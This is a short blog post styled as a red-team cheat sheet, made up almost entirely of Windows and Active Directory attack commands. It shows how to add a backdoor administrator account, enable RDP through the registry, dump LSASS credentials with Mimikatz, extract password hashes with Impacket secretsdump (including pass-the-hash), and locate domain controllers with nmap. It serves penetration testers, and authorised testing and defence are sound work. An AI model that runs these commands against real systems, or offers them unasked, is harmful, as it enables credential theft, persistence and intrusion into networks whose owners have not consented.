---
layout: blog
title: Red Team Field Manual
tags: 
comments: true
date: 2022-12-10
---

# Red Team Field Manual
<br />
### Create Local User And Add To Administrators Group
    net user <Username> <Password> /add>
    
    net localgroup Administrators <Username> /add   
  
### List Users In Active Directory

    net users /domain

### Enable RDP From Regedit

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

### Disable RDP From Regedit

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
    
### Lsass Dump via Mimikatz

    privilege::debug
    sekurlsa::minidump file.DMP (If there is a DMP file)
    sekurlsa::logonpasswords full
    
### Impacket secretsdump - DUMP Local User Hashes via Domain Creds
 
    python3 secretsdump.py <Domain>/<Domain Username>:<Password>@<IP> (Enter with Domain Creds)
    
### Impacket secretsdump - DUMP Local User Hashes via Domain NTLM Hash

    python3 secretsdump.py <Domain>/<Domain Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)
    
### Impacket secretsdump - DUMP Local User Hashes via Local User Creds
    
    python3 secretsdump.py <Computer_Hostname>/<Local Username>:<Password>@<IP> (Enter with Local Creds)
    
### Impacket secretsdump - DUMP Local User Hashes via Local User Hash

    python3 secretsdump.py <Computer_Hostname>/<Local Username>@<IP> -hashes <NTLM Hash> (Enter with NTLM Hash)

### Find Domain Controller In BlackBox Testing

    nmap -p389,636 --open -iL <IP_List_File> - 389(LDAP) / 636(LDAP-SSL)
    
    
    
    
